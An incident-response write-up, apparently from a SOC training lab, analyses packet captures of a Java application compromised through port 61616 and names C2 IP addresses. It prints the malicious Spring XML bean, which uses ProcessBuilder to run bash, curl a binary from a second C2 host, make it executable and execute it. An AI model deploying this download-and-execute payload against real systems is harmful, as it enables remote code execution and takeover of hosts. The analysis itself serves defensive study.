# Incident Response: Malicious XML Payload Exploitation

### **Scenario**
During your shift as a tier-2 SOC analyst, you receive an escalation from a tier-1 analyst regarding a public-facing server. This server has been flagged for making outbound connections to multiple suspicious IPs. In response, you initiate the standard incident response protocol, which includes isolating the server from the network to prevent potential lateral movement or data exfiltration and obtaining a packet capture from the NSM utility for analysis. Your task is to analyze the PCAP and assess for signs of malicious activity.

**Elapsed Time:** `00:04:54`

---

### **Top IPs Identified**
| IP Address        | Location       | Description              |
|-------------------|----------------|--------------------------|
| 84.239.49.16      | Romania        | Unknown                  |
| 146.190.21.92     | Netherlands    | C2 Server                |
| 134.209.197.3     | Netherlands    | Victim                   |
| 128.199.52.72     | Netherlands    | Second C2 Server         |

### **Suspicious Port Traffic**
- **Port 443** (HTTP): 4,833 Packets
- **Port 61616**: Used to execute an RCE by exploiting a Java-based application

The investigation noted suspicious traffic over these ports, leading to further analysis.

---

## **1. Identifying the C2 Servers**
Upon reviewing the packet capture using Wireshark, connections to **`146.190.21.92:8000`** were observed. The server requested an XML file located at `/invoice.xml`, which contained malicious code. This XML file referenced a second IP address, **`128.199.52.72`**, which was initially marked as "clean" but was later identified as another Command and Control (C2) server.

The attacker used this infrastructure to distribute and execute a malicious payload.

---

## **2. Analysis of the Malicious XML Payload**
The payload was delivered through a malicious XML file hosted on **`146.190.21.92`**. The XML file was structured using the Spring framework and contained the following bean configuration:

```xml
<bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
    <constructor-arg>
        <list>
            <value>bash</value>
            <value>-c</value>
            <value>curl -s -o /tmp/docker http://128.199.52.72/docker; chmod +x /tmp/docker; ./tmp/docker</value>
        </list>
    </constructor-arg>
</bean>
xml```

## **3. Identification of the Reverse Shell Executable**
The XML configuration initializes an instance of java.lang.ProcessBuilder, a standard Java class used to execute system commands. The method start() is invoked to execute a shell command (bash -c), which downloads a file named docker from the second C2 server at 128.199.52.72 and saves it in the /tmp directory.

The payload then changes the permissions of the file to make it executable and runs it. This tactic is a typical method used to gain initial access and control over a compromised host.
